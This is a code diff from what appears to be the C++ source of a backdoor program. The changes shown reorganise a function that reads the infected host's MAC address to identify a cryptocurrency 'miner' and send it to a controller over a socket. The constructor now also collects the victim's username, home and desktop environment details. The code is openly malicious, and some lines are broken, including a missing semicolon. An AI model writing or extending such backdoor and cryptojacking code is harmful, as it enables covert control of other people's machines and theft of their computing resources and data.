@@ -145,31 +145,22 @@ void Backdoor::persistence(){
 }
 
 
-std::string Backdoor::get_miner_id(){
-    if(this->is_server){
-        std::string miner_info;
-        this->c->send_message(this->sock, "4");
-        return this->c->recv_message(this->sock);
-    
-    }else{
-        
-        char wlan0[20], eth0[20];
-        FILE * f, *g; 
-        f = fopen("/sys/class/net/wlan0/address", "r");
-        if(f != NULL){
-            fscanf(f, "%s", wlan0);
-            fclose(f);
-            c->send_message(this->sock, wlan0);
-            return NULL;
+void Backdoor::get_miner_id(){    
+    char wlan0[20], eth0[20];
+    FILE * f, *g; 
+    f = fopen("/sys/class/net/wlan0/address", "r");
+    if(f != NULL){ // wlan0
+        fscanf(f, "%s", wlan0);
+        fclose(f);
+        this->miner_id = wlan0;
 
-        }else{
-            g = fopen("/sys/class/net/eth0/address", "r");
-            if(g != NULL){
-                fscanf(g, "%s", eth0);
-                fclose(g);
-                c->send_message(this->sock, eth0);
-                return NULL;
-            }
+    }else{ // ETH0
+        g = fopen("/sys/class/net/eth0/address", "r");
+        if(g != NULL){
+            fscanf(g, "%s", eth0);
+            fclose(g);
+            c->send_message(this->sock, eth0);
+            this->miner_id = eth0
         }
     }
 }
@@ -245,8 +236,9 @@ Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
 
     if(!is_server){
         // GET ENVIROMENT VARIABLES
-        get_home_enviroment();
-        get_username();
-        get_desktop_enviroment();
+        this->get_home_enviroment();
+        this->get_username();
+        this->get_desktop_enviroment();
+        this->get_miner_id();
     }
 }
